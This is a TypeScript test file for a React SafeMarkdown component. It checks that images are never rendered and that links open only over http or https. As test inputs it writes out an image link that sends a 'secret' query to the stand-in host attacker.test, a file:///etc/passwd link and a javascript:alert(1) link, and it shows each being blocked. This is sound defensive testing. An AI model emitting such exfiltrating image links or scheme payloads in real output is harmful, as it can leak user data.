// @vitest-environment jsdom

import { cleanup, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const openUrl = vi.fn((_url: string) => Promise.resolve())
vi.mock('@tauri-apps/plugin-opener', () => ({ openUrl: (url: string) => openUrl(url) }))

import SafeMarkdown, { webLinkTarget } from './safe-markdown'

afterEach(cleanup)
beforeEach(() => openUrl.mockClear())

describe('SafeMarkdown', () => {
	it('never renders images, so nothing is fetched on render', () => {
		const { container } = render(<SafeMarkdown>{'before ![x](https://attacker.test/?q=secret) after'}</SafeMarkdown>)
		expect(container.querySelector('img')).toBeNull()
		expect(container.innerHTML).not.toContain('attacker.test')
	})

	it('opens web links in the system browser instead of navigating', () => {
		render(<SafeMarkdown>{'[site](https://example.com/page)'}</SafeMarkdown>)
		const link = screen.getByRole('link', { name: 'site' })
		const event = new MouseEvent('click', { bubbles: true, cancelable: true })
		fireEvent(link, event)
		expect(event.defaultPrevented).toBe(true)
		expect(openUrl).toHaveBeenCalledWith('https://example.com/page')
	})

	it('does nothing for other schemes', () => {
		const { container } = render(<SafeMarkdown>{'[a](file:///etc/passwd) [b](javascript:alert(1)) [c](/relative)'}</SafeMarkdown>)
		const links = container.querySelectorAll('a')
		expect(links).toHaveLength(3)
		for (const link of links) {
			expect(link.getAttribute('href')).toBeNull()
			const event = new MouseEvent('click', { bubbles: true, cancelable: true })
			fireEvent(link, event)
			expect(event.defaultPrevented).toBe(true)
		}
		expect(openUrl).not.toHaveBeenCalled()
	})

	it('accepts only http and https', () => {
		expect(webLinkTarget('http://a.test')).toBe('http://a.test/')
		expect(webLinkTarget('mailto:x@a.test')).toBeNull()
		expect(webLinkTarget('tauri://localhost/x')).toBeNull()
		expect(webLinkTarget(undefined)).toBeNull()
	})
})
